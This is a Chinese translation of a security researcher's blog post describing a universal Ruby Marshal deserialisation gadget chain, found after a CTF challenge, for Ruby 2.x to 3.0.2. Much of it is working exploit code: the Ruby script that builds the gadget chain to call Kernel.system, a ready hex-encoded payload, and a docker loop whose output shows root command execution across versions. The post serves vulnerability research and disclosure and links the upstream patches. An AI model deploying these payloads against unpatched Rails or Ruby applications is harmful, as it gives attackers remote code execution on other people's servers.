https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

# Universal Deserialisation Gadget for Ruby 2.x-3.x

*更新于 2022 年 4 月*

该漏洞已被修补，因此仅适用于 Ruby 3.0.2 及以下版本：

- [rubygems/rubygems#141c2f43](https://github.com/rubygems/rubygems/commit/141c2f4388f0f6f81e4d420d73961dbd68f5c08f)
- [ruby/ruby#2b17d2f2](https://github.com/ruby/ruby/commit/2b17d2f2970d382ac61d15d66f46d1c56f8f2598)

---

我为 [pbctf 2020](https://ctftime.org/event/1121) 编写的一道挑战题涉及利用 Rails 应用中的反序列化漏洞来执行代码并获取 flag。该挑战运行于 ruby 2.7.2 和 rails 6.1，这意味着现有的公开 gadget 已不再适用，参赛者必须发现新的 gadget。

在研究过程中，我偶然发现了 [elttam](https://twitter.com/elttam) 发表的一篇精彩文章，题为 [Ruby 2.x Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/)。文章详细介绍了他们如何设计出一个无需加载任何额外 gem 的通用 gadget，非常值得一读（如果您还没读过的话）。

由于挑战题基于 Rails 编写，相比仅加载默认 gem 的情况，有更多的 gem 和类可供选择。参赛者提供了几种出色的解法，我找到的一种是将原始的 `DeprecatedInstanceVariableProxy` gadget 与调用 [ActiveModel::AttributeMethods::ClassMethods::CodeGenerator](https://github.com/rails/rails/blob/v6.1.0.rc1/activemodel/lib/active_model/attribute_methods.rb#L369) 的 `execute` 方法相结合，从而实现代码执行。

CTF 结束后，我决定继续探索，看看能否找到另一个通用 gadget，因为 elttam 文章中使用的 `Gem::StubSpecification` gadget [已在 ruby 2.7+ 中被修补](https://github.com/ruby/ruby/commit/1eaacb1ef538fe5af2fe231bb340fc39fef67547#diff-5daf0b4d40af647b25014bfbd30abaa25e34bd298d8503c180bb1f59edbdb885)。

我开始寻找一个可替代 `Gem::StubSpecification` 的类，要求能够实现代码执行、eval 或调用任意方法。我使用了 elttam 文章中相同的 `autoload` 技巧，并在 RubyMine 中用大量正则表达式搜索，最终找到了 [Net::WriteAdapter](https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L458)：

```ruby
class WriteAdapter
  def initialize(socket, method)
    @socket = socket
    @method_id = method
  end

  def inspect
    "#<#{self.class} socket=#{@socket.inspect}>"
  end

  def write(str)
    @socket.__send__(@method_id, str)
  end

  alias print write

  def <<(str)
    write str
    self
  end

  def puts(str = '')
    write str.chomp("\n") + "\n"
  end

  def printf(*args)
    write sprintf(*args)
  end
end
```

它看起来非常有希望，因为 `@socket` 和 `@method_id` 都可以被设置为任意值，如果能找到调用 `write`、`print`、`<<`、`puts` 或 `printf` 中任一方法的方式，就可以在对象上调用任意方法。

在经历了许多死胡同和更多搜索之后，我找到了 [Net::BufferedIO](https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L113)，它具有以下 `LOG` 方法：

```ruby
def read(len, dest = ''.b, ignore_eof = false)
  LOG "reading #{len} bytes..."
  #...
end

def LOG(msg)
  return unless @debug_output
  @debug_output << msg + "\n"
end

def eof?
  @io.eof?
end
```

该方法被 `read` 和 `readall` 调用，因此如果能找到调用 `read` 的方式，就可以链接到 `Net::WriteAdapter`。

同时我也开始寻找初始 / kick-off gadget，类似于 elttam 文章中调用 `each` 的 `Gem::Requirement`。其中发现的一个有趣的是 [Gem::Version](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/version.rb#L275)，它允许在任何对象上调用 `to_s`（相关代码）：

```ruby
# we can fully control the objects in this array
def marshal_load(array)
  initialize array[0]
end

def initialize(version)
  # first thing is the version check
  unless self.class.correct?(version)
    raise ArgumentError, "Malformed version number string #{version}"
  end

  version = 0 if version.is_a?(String) && version =~ /\A\s*\Z/
  @version = version.to_s.strip.gsub("-",".pre.")
  @segments = nil
end

def self.correct?(version)
  unless Gem::Deprecate.skip
    warn "nil versions are discouraged and will be deprecated in Rubygems 4" if version.nil?
  end

  # here to_s is called on our object
  !!(version.to_s =~ ANCHORED_VERSION_PATTERN)
end
```

为了找到这些方法，我稍微修改了现有的 `marshal_load` 方法检查，以快速查看哪些类实现了某个函数：

```ruby
def check(functions)
  ObjectSpace.each_object(::Class) do |obj|
    all_methods = (obj.instance_methods + obj.private_instance_methods).uniq

    functions.each do |function|
      if all_methods.include? function
        method_origin = obj.instance_method(function).inspect[/(.*)/, 1] || obj.to_s
        unless method_origin.nil? || method_origin == ''
          puts obj
          puts "  #{function} defined by #{method_origin}"
          puts "  ancestors = #{obj.ancestors}"
          puts
        end
      end
    end
  end
end
```

这为寻找 gadget 提供了更多选择，因为与 `marshal_load` 相比，实现的 `to_s` 方法相当多。以下是一些发现的例子：

[Gem::Resolver::ActivationRequest](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/resolver/activation_request.rb#L79) 允许在可控对象上调用 `name`、`version` 或 `platform`：

```ruby
class Gem::Resolver::ActivationRequest
  alias_method :to_s, :full_name

  def full_name
    name_tuple.full_name
  end

  def name_tuple
    @name_tuple ||= Gem::NameTuple.new(name, version, platform)
  end

  def name
    @spec.name
  end

  def version
    @spec.version
  end

  def platform
    @spec.platform
  end
```

[OptionParser::ParseError](https://github.com/ruby/ruby/blob/v2_7_2/lib/optparse.rb#L2085) 允许调用 `join`，以及使用可控参数调用 `[]` 方法：

```ruby
class ParseError < RuntimeError
  def initialize(*args, additional: nil)
    @additional = additional
    @arg0, = args
    @args = args
    @reason = nil
  end

  attr_reader :args
  attr_writer :reason
  attr_accessor :additional

  alias to_s message

  def message
    "#{reason}: #{args.join(' ')}#{additional[@arg0] if additional}"
  end

  def reason
    @reason || self.class::Reason
  end
```

我回到 gadget 链的另一端，开始寻找在对象上调用 `read` 的地方，最终发现了 [Gem::Package::TarReader](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader.rb#L61) 和 [Gem::Package::TarHeader](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_header.rb#L103)：

```ruby
class Gem::Package::TarReader
  def each
    return enum_for __method__ unless block_given?

    use_seek = @io.respond_to?(:seek)

    until @io.eof? do
      header = Gem::Package::TarHeader.from @io
      return if header.empty?
  # snip
  end
end

class Gem::Package::TarHeader
  def self.from(stream)
      header = stream.read 512
      empty = (EMPTY_HEADER == header)
  # snip
  end
end
```

由于已经有调用 `each` 的初始 gadget（感谢 elttam），这看起来非常有希望，可以构建一条链：`Gem::Requirement#marshal_load -> Gem::Package::TarReader#each -> Gem::Package::TarHeader#from -> Net::BufferedIO#read -> Net::BufferedIO#LOG -> Net::WriteAdapter#<<`。这将允许调用任何接受单个参数的方法。不幸的是，参数内容不可控，但它仍然是一个非常强大的 gadget。

要调用 `TarHeader.from`，需要一个 `eof?` 方法返回假值的类来通过条件判断。一个合适的选择是 [Gem::Package::TarReader::Entry](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader/entry.rb#L60)，因为 `eof?` 调用的结果很容易控制：

```ruby
class Gem::Package::TarReader::Entry
  ##
  # Is the tar entry closed?

  def closed?
    @closed
  end

  ##
  # Are we at the end of the tar entry?

  def eof?
    check_closed

    @read >= @header.size
  end

  def check_closed # :nodoc:
    raise IOError, "closed #{self.class}" if closed?
  end
```

现在可以把所有这些组合在一起，从而获得在对象上调用任意方法的能力：

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa = Net::WriteAdapter.new(Kernel, :vakzz)

io = Gem::Package::TarReader::Entry.allocate
io.instance_variable_set('@read', 0)
io.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', io)
n.instance_variable_set('@debug_output', wa)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)


payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

```plaintext
Traceback (most recent call last):
       13: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `<main>'
       12: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `load'
       11: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/gems/2.7.0/gems/irb-1.2.6/exe/irb:11:in `<top (required)>'
       10: from (irb):297
        9: from (irb):297:in `load'
        8: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load'
        7: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements'
        6: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each'
        5: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from'
        4: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
        3: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
        2: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
        1: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
NoMethodError (undefined method `vakzz' for Kernel:Module)
```

问题在于调用的参数是不可控的，但现在几乎任何类和方法都可以用于 gadget 链。在最初寻找调用 `Net::WriteAdapter` 方法的方式时，我发现了不少被丢弃的候选（因为当时不太可能找到调用它们的方式），现在这些都可以用了。其中之一是 [Gem::RequestSet#resolve](https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/request_set.rb#L399)：

```ruby
def resolve(set = Gem::Resolver::BestSet.new)
  @sets << set
  @sets << @git_set
  # snip
end
```

这非常完美，因为 `@sets` 和 `@git_set` 都是完全可控的，而参数 `set` 会被赋值为 gadget 链中的日志消息 `reading 512 bytes...`。另一个 `Net::WriteAdapter` gadget 可用于 `@sets`，它会先用不可控数据调用方法，然后再用可控的 `@git_set` 调用一次。

最终可以构造出触发 `Kernel.system("id")` 的 gadget：

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

```plaintext
sh: reading: command not found
uid=501(will) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(com.apple.sharepoint.group.2),703(com.apple.sharepoint.group.3),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
```

该 gadget 适用于 Ruby 2.x 到 3.x，且不需要加载除默认类之外的任何内容。

```bash
for i in `seq -f 2.%g 0 7; echo 3.0`; do echo -n "ruby:${i} - "; docker run --rm -it ruby:${i} ruby -e 'Marshal.load(["04085b08631547656d3a3a5370656346657463686572631347656d3a3a496e7374616c6c6572553a1547656d3a3a526571756972656d656e745b066f3a1c47656d3a3a5061636b6167653a3a546172526561646572063a0840696f6f3a144e65743a3a4275666665726564494f073b076f3a2347656d3a3a5061636b6167653a3a5461725265616465723a3a456e747279073a0a407265616469003a0c40686561646572492208616161063a0645543a124064656275675f6f75747075746f3a164e65743a3a577269746541646170746572073a0c40736f636b65746f3a1447656d3a3a52657175657374536574073a0d406769745f7365744922076964063b0c543a0a40736574736f3b0e073b0f6d0b4b65726e656c3a0f406d6574686f645f69643a0b73797374656d3b133a0c7265736f6c7665"].pack("H*")) rescue nil'; done

ruby:2.0 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.1 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.2 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.3 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.4 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.5 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.6 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:2.7 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
ruby:3.0 - sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
```